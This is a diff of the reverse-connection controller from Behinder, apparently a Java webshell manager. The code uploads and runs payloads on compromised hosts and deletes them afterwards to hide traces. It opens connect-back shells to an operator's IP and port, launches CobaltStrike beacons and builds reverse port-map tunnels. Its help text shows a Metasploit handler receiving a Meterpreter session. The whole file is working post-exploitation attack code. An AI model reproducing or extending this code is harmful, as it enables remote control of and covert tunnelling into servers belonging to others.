@@ -2,6 +2,7 @@ package net.rebeyond.behinder.ui.controller;
 
 import java.io.ByteArrayInputStream;
 import java.net.Socket;
+import java.net.SocketTimeoutException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Base64;
@@ -24,7 +25,7 @@ import javafx.scene.control.Toggle;
 import javafx.scene.control.ToggleGroup;
 import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
-import net.rebeyond.behinder.core.ShellService;
+import net.rebeyond.behinder.core.IShellService;
 import net.rebeyond.behinder.dao.ShellManager;
 import net.rebeyond.behinder.utils.Utils;
 import org.json.JSONArray;
@@ -48,8 +49,10 @@ public class ReverseViewController {
    private TextArea reverseHelpTextArea;
    @FXML
    private CheckBox isolatedCheckBox;
-   private ShellService currentShellService;
+   private IShellService currentShellService;
    private JSONObject shellEntity;
+   private JSONObject effectShellEntity;
+   private List reversePortMapThreadList = new ArrayList();
    private List workList;
    Map basicInfoMap;
    private Label statusLabel;
@@ -57,9 +60,10 @@ public class ReverseViewController {
    private String helpContentTemplate = "root@silver:/tmp# msfconsole\r\nmsf > use exploit/multi/handler \r\nmsf exploit(multi/handler) > set payload %s\r\npayload => %s\r\nmsf exploit(multi/handler) > show options\r\n\r\nPayload options (%s):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST                   yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Wildcard Target\r\n\r\n\r\nmsf exploit(multi/handler) > set lhost 0.0.0.0\r\nlhost => 0.0.0.0\r\nmsf exploit(multi/handler) > exploit \r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444 \r\n[*] Sending stage (53859 bytes) to 119.3.72.174\r\n[*] Meterpreter session 1 opened (192.168.0.166:4444 -> 119.3.72.174:47157) at 2018-08-23 11:03:41 +0800\r\n\r\nmeterpreter > ";
    private Map payloadList;
 
-   public void init(ShellService shellService, List workList, Label statusLabel, Map basicInfoMap) {
+   public void init(IShellService shellService, List workList, Label statusLabel, Map basicInfoMap) {
       this.currentShellService = shellService;
       this.shellEntity = shellService.getShellEntity();
+      this.effectShellEntity = shellService.getEffectShellEntity();
       this.workList = workList;
       this.basicInfoMap = basicInfoMap;
       this.statusLabel = statusLabel;
@@ -103,7 +107,7 @@ public class ReverseViewController {
       try {
          ImageView icon = new ImageView();
          icon.setImage(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/reverse.png"))));
-         icon.setFitHeight(14.0D);
+         icon.setFitHeight(14.0);
          icon.setPreserveRatio(true);
          this.reverseButton.setGraphic(icon);
       } catch (Exception var3) {
@@ -140,9 +144,9 @@ public class ReverseViewController {
                         isPortMapTunnel = true;
                      }
 
-                     final boolean finalIsPortMapTunnel = isPortMapTunnel;
+                     boolean finalisPortMapTunnel = isPortMapTunnel;
                      Platform.runLater(() -> {
-                        if (finalIsPortMapTunnel) {
+                        if (finalisPortMapTunnel) {
                            this.reverseButton.setText("关闭");
                         }
 
@@ -159,7 +163,7 @@ public class ReverseViewController {
                            return;
                         }
 
-                        if (this.shellEntity.getString("type").equals("php")) {
+                        if (this.effectShellEntity.getString("type").equals("php")) {
                            Platform.runLater(() -> {
                               Utils.showErrorMessage("提示", "cs上线暂不支持php服务端");
                            });
@@ -167,7 +171,7 @@ public class ReverseViewController {
                         }
 
                         String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
-                        if (this.shellEntity.getString("type").equals("jsp")) {
+                        if (this.effectShellEntity.getString("type").equals("jsp")) {
                            short portByteIndex;
                            byte[] nativeLibraryFileContent;
                            byte[] payloadFileContent;
@@ -197,13 +201,13 @@ public class ReverseViewController {
                               resultObj = this.currentShellService.executePayload(remoteUploadPath, Base64.getEncoder().encodeToString(payloadFileContent));
                               this.currentShellService.deleteFile(remoteUploadPath);
                            }
-                        } else if (this.shellEntity.getString("type").equals("aspx")) {
+                        } else if (this.effectShellEntity.getString("type").equals("aspx")) {
                            resultObj = this.currentShellService.connectBack(type, actualTargetIP, targetPort);
                            String status = resultObj.getString("status");
                            if (status.equals("fail")) {
-                              final JSONObject finalResultObj = resultObj;
+                              JSONObject finalresultObj = resultObj;
                               Platform.runLater(() -> {
-                                 String msg = finalResultObj.getString("msg");
+                                 String msg = finalresultObj.getString("msg");
                                  this.statusLabel.setText("反弹失败:" + msg);
                               });
                            } else {
@@ -219,9 +223,9 @@ public class ReverseViewController {
 
                      statusx = resultObj.getString("status");
                      if (statusx.equals("fail")) {
-                        final JSONObject fianlResultObj = resultObj;
+                        JSONObject finalresultObj = resultObj;
                         Platform.runLater(() -> {
-                           String msg = fianlResultObj.getString("msg");
+                           String msg = finalresultObj.getString("msg");
                            this.statusLabel.setText("反弹失败:" + msg);
                         });
                      } else {
@@ -245,7 +249,7 @@ public class ReverseViewController {
                Iterator var5 = this.ReversePortMapWorkerList.iterator();
 
                while(var5.hasNext()) {
-                  ReverseViewController.ReversePortMapWorker reversePortMapWorker = (ReverseViewController.ReversePortMapWorker)var5.next();
+                  ReversePortMapWorker reversePortMapWorker = (ReversePortMapWorker)var5.next();
                   reversePortMapWorker.stop();
                }
 
@@ -277,7 +281,7 @@ public class ReverseViewController {
          helpContent = "冰蝎支持Java和Aspx版本的CobaltStrike一键上线功能，采用windows/beacon_https/reverse_https上线方式。\r\n因为冰蝎采用注入JVM进程方式来植入代码，如果需要退出cs会话，需先将cs会话迁移至其他进程再退出，避免JVM进程停止。";
          this.reverseHelpTextArea.setText(helpContent);
       } else {
-         String shellType = this.shellEntity.getString("type");
+         String shellType = this.effectShellEntity.getString("type");
          String payloadName = (String)((Map)this.payloadList.get(reverseType)).get(shellType);
          helpContent = String.format(this.helpContentTemplate, payloadName, payloadName, payloadName);
       }
@@ -289,8 +293,8 @@ public class ReverseViewController {
       Runnable worker = () -> {
          try {
             JSONObject result = new JSONObject();
-            if (this.shellEntity.get("type").equals("php")) {
-               result.put("status", (Object)"success");
+            if (this.effectShellEntity.get("type").equals("php")) {
+               result.put("status", "success");
                Runnable backgroudRunner = () -> {
                   try {
                      this.currentShellService.createReversePortMap(listenPort);
@@ -309,10 +313,11 @@ public class ReverseViewController {
                Map paramMap = new HashMap();
                paramMap.put("listenIP", listenIP);
                paramMap.put("listenPort", listenPort);
-               ReverseViewController.ReversePortMapWorker reversePortMapWorkerDaemon = new ReverseViewController.ReversePortMapWorker("daemon", paramMap);
+               ReversePortMapWorker reversePortMapWorkerDaemon = new ReversePortMapWorker("daemon", paramMap);
                this.ReversePortMapWorkerList.add(reversePortMapWorkerDaemon);
                Thread reversePortMapWorker = new Thread(reversePortMapWorkerDaemon);
                reversePortMapWorker.start();
+               this.reversePortMapThreadList.add(reversePortMapWorker);
                this.workList.add(reversePortMapWorker);
                Platform.runLater(() -> {
                   this.statusLabel.setText("通信隧道创建成功。");
@@ -359,6 +364,13 @@ public class ReverseViewController {
          }
 
          this.socketMetaList = null;
+         var1 = ReverseViewController.this.reversePortMapThreadList.iterator();
+
+         while(var1.hasNext()) {
+            Thread thread = (Thread)var1.next();
+            thread.start();
+         }
+
       }
 
       public void run() {
@@ -377,25 +389,27 @@ public class ReverseViewController {
 
                   for(bytesRead = 0; bytesRead < socketArr.length(); ++bytesRead) {
                      JSONObject socketObj = socketArr.getJSONObject(bytesRead);
-                     String socketHash = socketObj.getString("socketHash");
-                     if (socketHash.startsWith("reverseportmap_socket") && !this.socketMetaList.containsKey(socketHash)) {
-                        Map socketMeta = new HashMap();
-                        socketMeta.put("status", "ready");
+                     String socketHashx = socketObj.getString("socketHash");
+                     if (socketHashx.startsWith("reverseportmap_socket") && !this.socketMetaList.containsKey(socketHashx)) {
+                        Map socketMetax = new HashMap();
+                        socketMetax.put("status", "ready");
                         Socket socketx = new Socket(listenIP, listenPort);
-                        socketMeta.put("status", "connected");
-                        socketMeta.put("socket", socketx);
-                        socketMeta.put("socketHash", socketHash);
-                        this.socketMetaList.put(socketHash, socketMeta);
+                        socketMetax.put("status", "connected");
+                        socketMetax.put("socket", socketx);
+                        socketMetax.put("socketHash", socketHashx);
+                        this.socketMetaList.put(socketHashx, socketMetax);
                         Map paramMap = new HashMap();
                         paramMap.put("listenIP", listenIP);
                         paramMap.put("listenPort", listenPort);
-                        paramMap.put("socketMeta", socketMeta);
-                        ReverseViewController.ReversePortMapWorker reversePortMapWorkerReader = ReverseViewController.this.new ReversePortMapWorker("read", paramMap);
-                        ReverseViewController.ReversePortMapWorker reversePortMapWorkerWriter = ReverseViewController.this.new ReversePortMapWorker("write", paramMap);
+                        paramMap.put("socketMeta", socketMetax);
+                        ReversePortMapWorker reversePortMapWorkerReader = ReverseViewController.this.new ReversePortMapWorker("read", paramMap);
+                        ReversePortMapWorker reversePortMapWorkerWriter = ReverseViewController.this.new ReversePortMapWorker("write", paramMap);
                         ReverseViewController.this.ReversePortMapWorkerList.add(reversePortMapWorkerReader);
                         ReverseViewController.this.ReversePortMapWorkerList.add(reversePortMapWorkerWriter);
                         Thread reader = new Thread(reversePortMapWorkerReader);
                         Thread writer = new Thread(reversePortMapWorkerWriter);
+                        ReverseViewController.this.reversePortMapThreadList.add(reader);
+                        ReverseViewController.this.reversePortMapThreadList.add(writer);
                         ReverseViewController.this.workList.add(reader);
                         ReverseViewController.this.workList.add(writer);
                         reader.start();
@@ -404,49 +418,64 @@ public class ReverseViewController {
                   }
 
                   Thread.sleep(3000L);
-               } catch (Exception var18) {
+               } catch (Exception var21) {
                   break;
                }
             }
          } else {
-            Map socketMetax;
-            String socketHashx;
+            Map socketMeta;
+            String socketHash;
             Socket socket;
-            byte[] buf;
-            JSONObject var24;
+            JSONObject var27;
             if (this.threadType.equals("read")) {
-               socketMetax = (Map)this.paramMap.get("socketMeta");
-               socketHashx = socketMetax.get("socketHash").toString();
-               socket = (Socket)socketMetax.get("socket");
+               socketMeta = (Map)this.paramMap.get("socketMeta");
+               socketHash = socketMeta.get("socketHash").toString();
+               socket = (Socket)socketMeta.get("socket");
 
                while(true) {
                   try {
-                     buf = ReverseViewController.this.currentShellService.readReversePortMapData(socketHashx);
-                     socket.getOutputStream().write(buf);
+                     JSONObject responseObj = ReverseViewController.this.currentShellService.readReversePortMapData(socketHash);
+                     if (!responseObj.getString("status").equals("success")) {
+                        try {
+                           var27 = ReverseViewController.this.currentShellService.closeReversePortMap(socketHash);
+                        } catch (Exception var17) {
+                        }
+                        break;
+                     }
+
+                     String msg = responseObj.getString("msg");
+                     byte[] data = Base64.getDecoder().decode(msg);
+                     socket.getOutputStream().write(data);
                      socket.getOutputStream().flush();
-                  } catch (Exception var19) {
+                  } catch (Exception var18) {
                      try {
-                        var24 = ReverseViewController.this.currentShellService.stopReversePortMap(this.paramMap.get("listenPort").toString());
+                        var27 = ReverseViewController.this.currentShellService.stopReversePortMap(this.paramMap.get("listenPort").toString());
                      } catch (Exception var16) {
                      }
                      break;
                   }
                }
             } else if (this.threadType.equals("write")) {
-               socketMetax = (Map)this.paramMap.get("socketMeta");
-               socketHashx = socketMetax.get("socketHash").toString();
-               socket = (Socket)socketMetax.get("socket");
+               socketMeta = (Map)this.paramMap.get("socketMeta");
+               socketHash = socketMeta.get("socketHash").toString();
+               socket = (Socket)socketMeta.get("socket");
 
-               try {
-                  buf = new byte[20480];
-
-                  for(bytesRead = socket.getInputStream().read(buf); bytesRead > 0; bytesRead = socket.getInputStream().read(buf)) {
-                     ReverseViewController.this.currentShellService.writeReversePortMapData(Arrays.copyOfRange(buf, 0, bytesRead), socketHashx);
-                  }
-               } catch (Exception var17) {
+               while(true) {
                   try {
-                     var24 = ReverseViewController.this.currentShellService.stopReversePortMap(this.paramMap.get("listenPort").toString());
-                  } catch (Exception var15) {
+                     byte[] buf = new byte[20480];
+
+                     for(bytesRead = socket.getInputStream().read(buf); bytesRead > 0; bytesRead = socket.getInputStream().read(buf)) {
+                        ReverseViewController.this.currentShellService.writeReversePortMapData(Arrays.copyOfRange(buf, 0, bytesRead), socketHash);
+                     }
+
+                     return;
+                  } catch (SocketTimeoutException var19) {
+                  } catch (Exception var20) {
+                     try {
+                        var27 = ReverseViewController.this.currentShellService.stopReversePortMap(this.paramMap.get("listenPort").toString());
+                     } catch (Exception var15) {
+                     }
+                     break;
                   }
                }
             }
